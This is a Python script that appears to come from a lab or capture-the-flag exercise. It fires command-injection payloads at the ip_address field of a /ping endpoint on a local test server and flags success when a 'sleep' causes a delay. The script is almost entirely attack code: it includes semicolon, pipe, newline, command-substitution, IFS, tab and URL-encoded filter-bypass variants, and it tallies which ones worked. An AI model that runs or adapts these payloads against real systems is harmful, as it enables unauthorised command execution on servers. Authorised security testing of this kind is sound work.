import requests
import time
import urllib.parse
import json

# Target configuration
TARGET_URL = "http://127.0.0.1:32817"
PING_ENDPOINT = "/ping"
SLEEP_TIME = 5  # seconds for time-based detection
TIMEOUT_THRESHOLD = 4.0  # threshold to consider as successful injection

# Session for consistent behavior
session = requests.Session()

print("=" * 80)
print("Command Injection Bypass Testing - Time-Based Detection")
print(f"Target: {TARGET_URL}{PING_ENDPOINT}")
print(f"Sleep Time: {SLEEP_TIME}s | Timeout Threshold: {TIMEOUT_THRESHOLD}s")
print("=" * 80)

# Define payload patterns - organized by bypass technique
def generate_payloads():
    payloads = []
    
    # Base command separators with sleep
    base_sleep = f"sleep {SLEEP_TIME}"
    
    # 1. Standard separators
    payloads.extend([
        ("Semicolon (;)", f"; {base_sleep}"),
        ("Ampersand (&)", f"& {base_sleep}"),
        ("Double Ampersand (&&)", f"&& {base_sleep}"),
        ("Double Pipe (||)", f"|| {base_sleep}"),
        ("Pipe (|)", f"| {base_sleep}"),
    ])
    
    # 2. Newline-based
    payloads.extend([
        ("Newline (%0a)", f"%0a{base_sleep}"),
        ("CRLF (%0d%0a)", f"%0d%0a{base_sleep}"),
    ])
    
    # 3. Command substitution
    payloads.extend([
        ("Command Sub ($())", f"$({base_sleep})"),
        ("Backticks", f"`{base_sleep}`"),
    ])
    
    # 4. Background execution
    payloads.extend([
        ("Background (&)", f"& {base_sleep} &"),
        ("Background (nohup)", f"; nohup {base_sleep} &"),
    ])
    
    # 5. Space bypass techniques
    payloads.extend([
        ("Space bypass (IFS)", f";${{IFS}}{base_sleep}"),
        ("Space bypass ({cmd})", f";{{sleep,{SLEEP_TIME}}}"),
        ("Space bypass (TAB)", f";%09{base_sleep}"),
        ("Space bypass (<)", f";<{base_sleep}"),
    ])
    
    # 6. Encoded variants
    payloads.extend([
        ("URL Encoded", urllib.parse.quote(f"; {base_sleep}")),
        ("Double URL Encoded", urllib.parse.quote(urllib.parse.quote(f"; {base_sleep}"))),
    ])
    
    # 7. Combined techniques
    payloads.extend([
        ("Combined ($() + ;)", f"; $({base_sleep})"),
        ("Combined (%0a + &&)", f"%0a&& {base_sleep}"),
        ("Combined (IFS + ;)", f"%0a${{IFS}}{base_sleep}"),
    ])
    
    return payloads

# Test each payload
def test_payload(payload_name, payload_value):
    test_data = {"ip_address": payload_value}
    start_time = time.time()
    
    try:
        response = session.post(
            f"{TARGET_URL}{PING_ENDPOINT}",
            data=test_data,
            timeout=SLEEP_TIME + 10  # Give extra time for valid delays
        )
        end_time = time.time()
        response_time = end_time - start_time
        status = response.status_code
        
    except requests.exceptions.Timeout:
        end_time = time.time()
        response_time = end_time - start_time
        status = "TIMEOUT"
    except Exception as e:
        end_time = time.time()
        response_time = end_time - start_time
        status = f"ERROR: {str(e)}"
    
    return {
        "payload_name": payload_name,
        "payload_value": payload_value,
        "response_time": response_time,
        "status_code": status,
        "success": response_time >= TIMEOUT_THRESHOLD
    }

# Main testing loop
print("\n[+] Starting payload testing...\n")

payloads = generate_payloads()
results = []

for idx, (payload_name, payload_value) in enumerate(payloads, 1):
    print(f"[{idx}/{len(payloads)}] Testing: {payload_name}")
    print(f"Payload: {payload_value}")
    
    result = test_payload(payload_name, payload_value)
    results.append(result)
    
    # Print result with timing
    status_indicator = "✓" if result["success"] else "✗"
    print(f"{status_indicator} Status: {result['status_code']} | Time: {result['response_time']:.2f}s")
    print("-" * 80)

# Summary of successful payloads
print("\n" + "=" * 80)
print("SUMMARY - SUCCESSFUL PAYLOADS (Time >= {}s)".format(TIMEOUT_THRESHOLD))
print("=" * 80)

successful = [r for r in results if r["success"]]

if successful:
    print(f"\n[+] Found {len(successful)} potentially successful payloads:\n")
    for idx, result in enumerate(successful, 1):
        print(f"[{idx}] {result['payload_name']}")
        print(f"    Payload: {result['payload_value']}")
        print(f"    Response Time: {result['response_time']:.2f}s")
        print(f"    Status Code: {result['status_code']}")
        print()
else:
    print("\n[-] No payloads caused significant delays. Command injection may be blocked or filtered.")

# Detailed results in JSON format for analysis
print("\n" + "=" * 80)
print("DETAILED RESULTS (JSON)")
print("=" * 80)
print(json.dumps(results, indent=2))

# Save results to file for further analysis
with open("cmdi_test_results.json", "w") as f:
    json.dump(results, f, indent=2)

print("\n[+] Results saved to cmdi_test_results.json")

